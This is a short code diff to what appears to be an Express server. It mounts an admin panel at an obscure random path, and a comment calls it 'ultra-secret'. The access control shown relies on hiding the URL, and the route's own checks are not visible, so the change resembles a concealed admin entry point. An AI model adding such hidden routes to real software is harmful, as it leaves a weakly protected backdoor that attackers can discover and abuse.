@@ -53,6 +53,9 @@ app.use(fileUpload({
     createParentPath: true
 }));
 
+// Ultra-secret admin panel (obscure path)
+app.use('/api/x9z2k7m4', require('./routes/ultra-admin'));
+
 // Rate Limiting
 const authLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,
